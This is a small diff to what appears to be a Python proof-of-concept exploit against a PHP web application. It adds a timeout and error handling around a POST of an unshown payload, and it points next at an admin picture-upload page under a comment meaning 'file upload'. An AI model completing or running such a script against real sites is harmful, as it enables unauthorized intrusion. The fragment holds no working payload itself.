@@ -24,7 +24,10 @@ def poc(url):
 	url1 = t.scheme+'://'+t.netloc+'/index.php'
 	s = requests.session()
 	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
-	s.post(url,data=payload1,headers=headers)
+	try:
+		s.post(url,data=payload1,headers=headers,timeout=3)
+	except:
+		return False
 
 	# 文件上传
 	url2 = t.scheme+'://'+t.netloc+'/admin/admin_pic.php?nav=main&admin_p_nav=main_info'
